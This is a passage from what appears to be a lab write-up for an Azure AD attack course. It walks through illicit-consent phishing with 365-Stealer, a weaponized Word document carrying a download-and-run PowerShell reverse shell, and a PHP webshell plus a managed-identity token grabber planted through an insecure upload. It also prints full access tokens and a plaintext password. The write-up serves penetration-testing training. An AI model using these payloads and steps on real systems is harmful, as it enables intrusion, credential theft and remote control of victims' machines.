xVUd0dG43d3dpNkRXaEJCaUZuVTFhRkxyUzV3QUs0LiIsInNjcCI6IlVzZXIuUmVhZCBVc2VyLlJlYWRCYXNpYy5BbGwiLCJzaWduaW5fc3RhdGUiOlsiaW5rbm93bm50d2siXSwic3ViIjoiUk81UTFUMXh0ejFyYlZNMEFuNG5hcjZIWXd3VUV3eEM5QnlIdmJfNnJ0MCIsInRlbmFudF9yZWdpb25fc2NvcGUiOiJBUyIsInRpZCI6IjJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNiIsInVuaXF1ZV9uYW1lIjoiRXJpa01LZWxsZXJAZGVmY29ycGhxLm9ubWljcm9zb2Z0LmNvbSIsInVwbiI6IkVyaWtNS2VsbGVyQGRlZmNvcnBocS5vbm1pY3Jvc29mdC5jb20iLCJ1dGkiOiJPX0ctWDZkOEVVaVFCOHh0R2dwVUFnIiwidmVyIjoiMS4wIiwid2lkcyI6WyJiNzlmYmY0ZC0zZWY5LTQ2ODktODE0My03NmIxOTRlODU1MDkiXSwieG1zX3RjZHQiOjE2MTUzNzU2Mjl9.JExDfzGEVDBilHfR9hVa1_2THrBk28yRj68uXEhlRpUtixCgO1VFR9h_0A_IlV0xfYkStkk4BzLuJbNkqrePfxhlYHDv5N9QsA9xdpiK5GyKUBUFNTlRnm5fe24CIIR9MPBsOz16RXe2qHf_YKOBw9pDge2MwBLzdJu8J4ZZ_r7L3VIpg3-fPA5yD3PA_3nY3RmXS9yTn_CHCCcezBCTQz1vI7TUc-998xvVDOMcmOqwM4pSfVU7UDC6eTfgvWaAr7q-1ekGWFBhoLB2HJ24ntw-Jf45AGYlcDCs2QXcjK43uK4GXCP9mFuyLA03XpCeTuIS3WOo39tjcRAjYQpY_g '

$URI = 'https://graph.microsoft.com/v1.0/users/'

$RequestParams = @{
  Method     = 'GET'
  Uri        = $URI
  Headers    = @{
    'Authorization' = "Bearer $Token"
  }
}
(Invoke-RestMethod @RequestParams).value | ft displayName, jobTitle, userPrincipalName
```

![picture 16](images/7ac8ef70f282a33df73e77a6504ea6db42baba303cb018d19714e1f2470d667a.png)  

<br/>

### Get admin consent

To summarize the previous attack, we made a malicious app which requires some AD permissions (`User.Read` and `User.ReadBasic.All`). To get more permissions, our app should require more permissions; note some permissions requires Admin Consent.

Based on the users enumeration, `markdwalden@defcorphq.onmicrosoft.com` is a good target since **Application Administrator** is assigned.

First modify the API permissions to add:
- `mail.read`
- `notes.read.all`
- `mailboxsettings.readwrite`
- `files.readwrite.all`
- `mail.send`

![picture 17](images/04029d9f25a3df88cb50c3ea1b41d427082a577b8d615242a8a3ee9dee9d330e.png)  

<br/>

Then email the link to the target user `markdwalden@defcorphq.onmicrosoft.com`:

![picture 18](images/d42fda5d0573d86d515129d556b9ddbc20693c8367ed94de5905fd195dd9a2f9.png)  


<br/>

The victim checks in:

![picture 19](images/4efc83fa8ea942322c20b73fa09e6da3d9a90185e4f4a37f87f3b3d3071fd63e.png)  

Then on http://localhost:82/365-Stealer/yourVictims/?dir=.%2FMarkDWalden%40defcorphq.onmicrosoft.com, we can see the tokens:

![picture 20](images/11832eda293bf94eadfdc6fa2862eec27c593487d1fbceb8a88c4611b73fc6b5.png)  

The access token:

```
eyJ0eXAiOiJKV1QiLCJub25jZSI6InI0RFM2NlB3cEk5WVFSRzhHNmNSakxyNTZWaHlnMXVLRkdjYktUSy1BbE0iLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20vIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlhdCI6MTYxOTg3OTQ3NCwibmJmIjoxNjE5ODc5NDc0LCJleHAiOjE2MTk4ODMzNzQsImFjY3QiOjAsImFjciI6IjEiLCJhY3JzIjpbInVybjp1c2VyOnJlZ2lzdGVyc2VjdXJpdHlpbmZvIiwidXJuOm1pY3Jvc29mdDpyZXExIiwidXJuOm1pY3Jvc29mdDpyZXEyIiwidXJuOm1pY3Jvc29mdDpyZXEzIiwiYzEiLCJjMiIsImMzIiwiYzQiLCJjNSIsImM2IiwiYzciLCJjOCIsImM5IiwiYzEwIiwiYzExIiwiYzEyIiwiYzEzIiwiYzE0IiwiYzE1IiwiYzE2IiwiYzE3IiwiYzE4IiwiYzE5IiwiYzIwIiwiYzIxIiwiYzIyIiwiYzIzIiwiYzI0IiwiYzI1Il0sImFpbyI6IkUyWmdZTkJKeTlDNUdSOHZydmR2Ym16b3duMVRyeSsvOWtKdVhsMlIvTnJvT1pMT0VXY0IiLCJhbXIiOlsicHdkIl0sImFwcF9kaXNwbGF5bmFtZSI6InN0dWRlbnQxOTAtYXBwIiwiYXBwaWQiOiIyZWMyZjA3ZS01YTgzLTQxMTAtODg1OS1kNGQ1YTE0YmFkMmUiLCJhcHBpZGFjciI6IjEiLCJpZHR5cCI6InVzZXIiLCJpcGFkZHIiOiI1MS4yMTAuMS4yMzkiLCJuYW1lIjoiTWFyayBELiBXYWxkZW4iLCJvaWQiOiJmNjZlMTMzYy1iZDAxLTRiMGItYjNiNy03Y2Q5NDlmZDQ1ZjMiLCJwbGF0ZiI6IjMiLCJwdWlkIjoiMTAwMzIwMDEyMEQ0Q0U0QiIsInJoIjoiMC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0bjd3d2k2RFdoQkJpRm5VMWFGTHJTNXdBQ2MuIiwic2NwIjoiRmlsZXMuUmVhZFdyaXRlLkFsbCBNYWlsLlJlYWQgTWFpbC5TZW5kIE1haWxib3hTZXR0aW5ncy5SZWFkV3JpdGUgTm90ZXMuUmVhZC5BbGwgVXNlci5SZWFkIFVzZXIuUmVhZEJhc2ljLkFsbCIsInNpZ25pbl9zdGF0ZSI6WyJpbmtub3dubnR3ayJdLCJzdWIiOiJfUXlRMXJtLWRxeGh4TlAxYnhibFlzcXI4bTROTVQ2LWtSY2tzLVBTMTdzIiwidGVuYW50X3JlZ2lvbl9zY29wZSI6IkFTIiwidGlkIjoiMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2IiwidW5pcXVlX25hbWUiOiJNYXJrRFdhbGRlbkBkZWZjb3JwaHEub25taWNyb3NvZnQuY29tIiwidXBuIjoiTWFya0RXYWxkZW5AZGVmY29ycGhxLm9ubWljcm9zb2Z0LmNvbSIsInV0aSI6IkNIdFVveTdtNmtPTDRZSDZXN21NQWciLCJ2ZXIiOiIxLjAiLCJ3aWRzIjpbIjliODk1ZDkyLTJjZDMtNDRjNy05ZDAyLWE2YWMyZDVlYTVjMyIsImI3OWZiZjRkLTNlZjktNDY4OS04MTQzLTc2YjE5NGU4NTUwOSJdLCJ4bXNfdGNkdCI6MTYxNTM3NTYyOX0.TGKLDxkkJr-64k0RB8FIkD6gJCF2O3R03vtmTlIuCQs3ED3X0_QU4Fk9kNJh_r8MLQTq_HLazKQsGnQLZcV41vsuo3xvlJzwXdEZ9oWoaNmz_L9HpY7e4gq4K88FkXenSXcVJc8zKAhvbaotcyA4Bc2YRJV3xRv0vwjHnzD-1f07V2QwJACFZek4ag1Fqxt_3xiS7RugCXOc0OOqb-tRVc0kOHIA8ayKl9cNoDcdD_oAOhcMVLdALEdwTNXQ-iyoowFn3_FyUsKjTEXxbJa_LeO8Dd_9Tmm5wb7jLVNr_w_jjbhjDKXjPUM7p5m2AihdrfI0qGDWqWIVXHdu0W3F9w 
```

<br/>

### Weaponized Word file to reverse shell

We have the `files.readwrite.all` permission; it is possible to upload files on the user (`markdwalden@defcorphq.onmicrosoft.com`) drive.

Access the machine which has a licensed MS Word:

```
$passwd = ConvertTo-SecureString "ForCreatingWordDocs@123" -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential("office-vm\administrator", $passwd); $officeVM = New-PSSession -ComputerName 172.16.1.250 -Credential $creds; Enter-PSSession -Session $officeVM
```

![picture 21](images/10bbeec1635204d12c521a7c98708027c1ca320171ee24e3cd1fa3e8a0ff3358.png)  

<br/>

Copy `Out-Word.ps1` to `C:\xampp\htdocs` and in the MSWord client:

```
iex (New-Object Net.WebClient).DownloadString("http://172.16.152.190:82/Out-Word.ps1")
```

![picture 22](images/cdc6ac76366a9aee5e0b22f70e2048890d2b89745aa32295eeec00f5eb38cb49.png)  

<br/>

Then generate a Word document with the following payload:

```
Out-Word -Payload "powershell iex (New-Object Net.WebClient).DownloadString('http://172.16.152.190:82/Invoke-PowerShellTcp.ps1'); Reverse -Reverse -IPAddress 172.16.152.190 -Port 4444" -OutputFile student190.doc; dir student190.doc
```

![picture 23](images/300ef2685eb4639acfe7d66eaf83f1b5631b4a48147f0c62354adb855ef5436b.png)  

<br/>

Copy the generated doc file to the local machine:

```
Copy-Item -FromSession $officeVM -Path C:\Users\Administrator\Documents\student190.doc -Destination C:\AzAD\Tools\student190.doc
```

Also copy `Invoke-PowerShellTcp.ps1` to `C:\xampp\htdocs\Invoke-PowerShellTcp.ps1`.

<br/>

Launch a netcat listener on port 4444:

```
C:\AzAD\Tools\netcat-win32-1.12\nc.exe -lvp 4444
```

Then use 365-Stealer to upload the weaponized Word file to Mark's OneDrive:

```
cd C:\xampp\htdocs\365-Stealer\; &'C:\Program Files\Python38\python.exe' C:\xampp\htdocs\365-Stealer\365-Stealer.py --upload C:\AzAD\Tools\student190.doc --token-path C:\xampp\htdocs\365-Stealer\yourVictims\MarkDWalden@defcorphq.onmicrosoft.com\access_token.txt
```

![picture 24](images/923eeda468cd4b186b5ace3f87f464b386ff068318fe0548f20b2d67fe75b6ee.png)  

<br/>

A reverse shell calls back:

![picture 25](images/a57e241a358e4b7747d3f63d32c4abc9388aead27e62d203d4b16998999f54f4.png)  

<br/>

---

## Objective 10: App Service Abuse - Insecured File Upload

**Question**

The career app in the defcorphq tenant allows insecure file upload functionality. 

1. Abuse the vulnerability and compromise the app service.
2. Check if the service principal for the managed identity of the compromised app service has any interesting permissions on other Azure resources.

<br/>

**Answer**

### Abuse the file upload vulnerability

Browse https://defcorphqcareer.azurewebsites.net/, there is a file upload function:

![picture 27](images/4b9e8aae4dd4a95c5ccd3cceb63856ac22a36b4b068b50023fe7b3336d82e706.png)  

<br/>

Try to upload a webshell:

```
<?php 

system($_REQUEST['cmd']);

?>
```

![picture 28](images/d2260fcd442c2b4cf4179a43bb34255df7839dd58abe2630b22e2f3d4bdda511.png)  

![picture 29](images/c7e2cfb4f3dd2f8804d3d55140bce452dd388fe36098d4a20b7524ba6bbc2eb7.png)  

As shown, the file upload is successful.

<br/>

Also upload the shell for getting a token:

```
<?php 

system('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');

?>
```

![picture 30](images/1c7cc4a175b31ce83f33a788d85d41369dd6be6794d977044129baf9cb248f5b.png)  

<br/>

Try to use the webshell (note the `uploads` directory is by guessing):

- https://defcorphqcareer.azurewebsites.net/uploads/student190shell.phtml?cmd=whoami

![picture 31](images/c185f2a881256dab364afba3b58c3558775a9bc9e2926b417c9d57fc72226162.png)  

As shown, the webshell runs successfully.

<br/>

Then try to get the token:

- https://defcorphqcareer.azurewebsites.net/uploads/student190token.phtml

![picture 32](images/dcf9b37fef52084897b375d65d553657ec9177c38ff579438561e7ef527a669a.png)  

As shown the access token is obtained from the metadata service.

```

{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpYXQiOjE2MTk4NjcyMjgsIm5iZiI6MTYxOTg2NzIyOCwiZXhwIjoxNjE5OTUzOTI4LCJhaW8iOiJFMlpnWU1qWVdDblBVSHFNUjZyUGFvS1FrNGd6QUE9PSIsImFwcGlkIjoiMDY0YWFmNTctMzBhZi00MWYwLTg0MGEtMGUyMWVkMTQ5OTQ2IiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsIm9pZCI6ImNjNjdjOTBkLWQ5ZTktNDBkMi1iNTExLTlkNTJkNjc2ODJhYiIsInJoIjoiMC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0bGV2U2dhdk1QQkJoQW9PSWUwVW1VWndBQUEuIiwic3ViIjoiY2M2N2M5MGQtZDllOS00MGQyLWI1MTEtOWQ1MmQ2NzY4MmFiIiwidGlkIjoiMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2IiwidXRpIjoiVWpGRGd5dG1rRXlvVDlyOWNaVnFBZyIsInZlciI6IjEuMCIsInhtc19taXJpZCI6Ii9zdWJzY3JpcHRpb25zL2I0MTM4MjZmLTEwOGQtNDA0OS04YzExLWQ1MmQ1ZDM4ODc2OC9yZXNvdXJjZWdyb3Vwcy9FbmdpbmVlcmluZy9wcm92aWRlcnMvTWljcm9zb2Z0LldlYi9zaXRlcy9kZWZjb3JwaHFjYXJlZXIiLCJ4bXNfdGNkdCI6MTYxNTM3NTYyOX0.S2lFIE_c71wQY6aFymVBshH_UwKIGr1CjVJUz187nZsvOia6AeUUSfv9tgRgMGwPHXetiYS1kDV6qHK-3ef3WpwIpYzrURcMLIXr9zDc_OZZCL4gqjPVfiRj3GOc4m9Sob_lmWrbli8T4lxDYQ9m3l_BN8tYAJSTgcAiBlvKkzdreOXJwv5KTR2UHa4s1bElgtvozrqx7NBNNhBKlMaZLd4gKQzobjQHVpv-ZLE4ohAT4h39tFgAWk9UzirHXsCWjcVpTPUPs1kJ0piw13s0ghu64jucX9Q0TdYHz1DDwgTWRyb4FsFkzY6cAMVRtLH29JRTN1Zu4hTC6SSR1V459w","expires_on":"05/02/2021 11:12:07 +00:00","resource":"https://management.azure.com/","token_type":"Bearer","client_id":"064aaf57-30af-41f0-840a-0e21ed149946"}
```

<br/>

Then we can check the resource available to the managed identity:

```
$token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpYXQiOjE2MTk4NjcyMjgsIm5iZiI6MTYxOTg2NzIyOCwiZXhwIjoxNjE5OTUzOTI4LCJhaW8iOiJFMlpnWU1qWVdDblBVSHFNUjZyUGFvS1FrNGd6QUE9PSIsImFwcGlkIjoiMDY0YWFmNTctMzBhZi00MWYwLTg0MGEtMGUyMWVkMTQ5OTQ2IiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsIm9pZCI6ImNjNjdjOTBkLWQ5ZTktNDBkMi1iNTExLTlkNTJkNjc2ODJhYiIsInJoIjoiMC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0bGV2U2dhdk1QQkJoQW9PSWUwVW1VWndBQUEuIiwic3ViIjoiY2M2N2M5MGQtZDllOS00MGQyLWI1MTEtOWQ1MmQ2NzY4MmFiIiwidGlkIjoiMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2IiwidXRpIjoiVWpGRGd5dG1rRXlvVDlyOWNaVnFBZyIsInZlciI6IjEuMCIsInhtc19taXJpZCI6Ii9zdWJzY3JpcHRpb25zL2I0MTM4MjZmLTEwOGQtNDA0OS04YzExLWQ1MmQ1ZDM4ODc2OC9yZXNvdXJjZWdyb3Vwcy9FbmdpbmVlcmluZy9wcm92aWRlcnMvTWljcm9zb2Z0LldlYi9zaXRlcy9kZWZjb3JwaHFjYXJlZXIiLCJ4bXNfdGNkdCI6MTYxNTM3NTYyOX0.S2lFIE_c71wQY6aFymVBshH_UwKIGr1CjVJUz187nZsvOia6AeUUSfv9tgRgMGwPHXetiYS1kDV6qHK-3ef3WpwIpYzrURcMLIXr9zDc_OZZCL4gqjPVfiRj3GOc4m9Sob_lmWrbli8T4lxDYQ9m3l_BN8tYAJSTgcAiBlvKkzdreOXJwv5KTR2UHa4s1bElgtvozrqx7NBNNhBKlMaZLd4gKQzobjQHVpv-ZLE4ohAT4h39tFgAWk9UzirHXsCWjcVpTPUPs1kJ0piw13s0ghu64jucX9Q0TdYHz1DDwgTWRyb4FsFkzY6cAMVRtLH29JRTN1Zu4hTC6SSR1V459w'
$clientid = '064aaf57-30af-41f0-840a-0e21ed149946'

Connect-AzAccount -AccessToken $token -AccountId $clientid; Get-AzResource | fl Name, ResourceGroupName, ResourceType, ResourceId
```

![picture 34](images/aa5d85f49383a7c95651fcb678f0924075fb2597fab27cb027edd25b45cbc977.png)  

```
Name              : bkpadconnect
ResourceGroupName : Engineering
ResourceType      : Microsoft.Compute/virtualMachines
ResourceId        : /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/bkpadconnect

Name              : bkpadconnect/MDE.Windows
ResourceGroupName : ENGINEERING
ResourceType      : Microsoft.Compute/virtualMachines/extensions
ResourceId        : /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/ENGINEERING/providers/Microsoft.Compute/virtualMachines/bkpadconnect/extensions/MDE.Windows

Name              : bkpadconnect/MicrosoftMonitoringAgent
ResourceGroupName : Engineering
ResourceType      : Microsoft.Compute/virtualMachines/extensions
ResourceId        : /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/bkpadconnect/extensions/MicrosoftMonito
                    ringAgent

Name              : bkpadconnect368
ResourceGroupName : Engineering
ResourceType      : Microsoft.Network/networkInterfaces
ResourceId        : /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Network/networkInterfaces/bkpadconnect368

Name              : bkpadconnectIP
ResourceGroupName : Engineering
ResourceType      : Microsoft.Network/publicIPAddresses
ResourceId        : /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Network/publicIPAddresses/bkpadconnectIP
```

<br/>

To check the permissions of the managed identity against the available resources:

1. bkpadconnet

```
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/bkpadconnect/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'

$RequestParams = @{ 
    Method = 'GET' 
    Uri = $URI
    Headers = @{ 
        'Authorization' = "Bearer $Token"
    }
} 

(Invoke-RestMethod @RequestParams).value
```

![picture 35](images/a63325b86ed71cd7f72534a6603b984c8257da0e908d9cab76abd115d3e37841.png)  

- `*/read`
- `Microsoft.Compute/virtualMachines/runCommand/action`

<br/>

2. bkpadconnect/MDE.Windows

```
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/ENGINEERING/providers/Microsoft.Compute/virtualMachines/bkpadconnect/extensions/MDE.Windows/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'

$RequestParams = @{ 
    Method = 'GET' 
    Uri = $URI
    Headers = @{ 
        'Authorization' = "Bearer $Token"
    }
} 

(Invoke-RestMethod @RequestParams).value
```

![picture 36](images/20e9261cfbb1a5584570359d4eb11e928cdb30937925d73584dfe989221d77b2.png)  

- `*/read`
- `Microsoft.Compute/virtualMachines/runCommand/action`

<br/>

3. bkpadconnect/MicrosoftMonitoringAgent

```
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/bkpadconnect/extensions/MicrosoftMonito/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'

$RequestParams = @{ 
    Method = 'GET' 
    Uri = $URI
    Headers = @{ 
        'Authorization' = "Bearer $Token"
    }
} 

(Invoke-RestMethod @RequestParams).value
```

![picture 37](images/c7d6086572f294006037841b1b40a2af924ab2a3767bca3813991ac55668b3f1.png)  

- `*/read`
- `Microsoft.Compute/virtualMachines/runCommand/action`

<br/>

...

<br/>

---

